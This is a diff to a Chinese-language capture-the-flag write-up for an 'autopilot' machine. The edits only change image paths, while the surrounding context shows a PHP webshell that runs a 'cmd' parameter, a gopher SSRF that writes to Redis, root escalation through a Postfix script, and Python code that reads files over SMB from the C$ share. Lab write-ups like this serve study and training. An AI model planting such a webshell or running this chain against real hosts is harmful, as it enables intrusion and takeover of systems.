@@ -110,7 +110,7 @@ $c=$_GET["cmd"]??"id"; @passthru($c." 2>&1"); ?>
 
 触发一次 `downloadtotmp`（`ids: ["#R#<account>/mock/route_exec"]`）就会让插件去 fetch 那个 gopher 地址，Redis 收下 SETEX。之后直接打 webshell：
 
-![Files 后端指向自身 → gopher 写 Redis 路由 → /files/index.php/ctf 以 grofiles 执行](../../autopilot/01-foothold.png)
+![Files 后端指向自身 → gopher 写 Redis 路由 → /files/index.php/ctf 以 grofiles 执行](/autopilot/01-foothold.png?v=2)
 
 ```
 uid=462(grofiles) gid=462(grofiles) groups=462(grofiles)
@@ -156,7 +156,7 @@ exec /usr/lib/postfix/bin/postfix-script "$@"
 
 Postfix 一重载就以 root 执行它，setuid bash 落地：
 
-![Admin API 改 dbconf → Postfix 执行我们的脚本 → euid=0](../../autopilot/02-root.png)
+![Admin API 改 dbconf → Postfix 执行我们的脚本 → euid=0](/autopilot/02-root.png?v=2)
 
 ```
 uid=462(grofiles) gid=462(grofiles) euid=0(root) groups=462(grofiles)
@@ -186,7 +186,7 @@ smb.login("da-stephanie.lewis", "<password>", "AUTOPILOT")
 buf = bytearray(); smb.getFile("C$", r"Users\Administrator\Desktop\root.txt", buf.extend)
 ```
 
-![靶机侧一次性桥 → 本地 SMB 读 C$ → root.txt](../../autopilot/03-dc-smb.png)
+![靶机侧一次性桥 → 本地 SMB 读 C$ → root.txt](/autopilot/03-dc-smb.png?v=2)
 
 ## 复盘：这条链哪里最容易卡
 
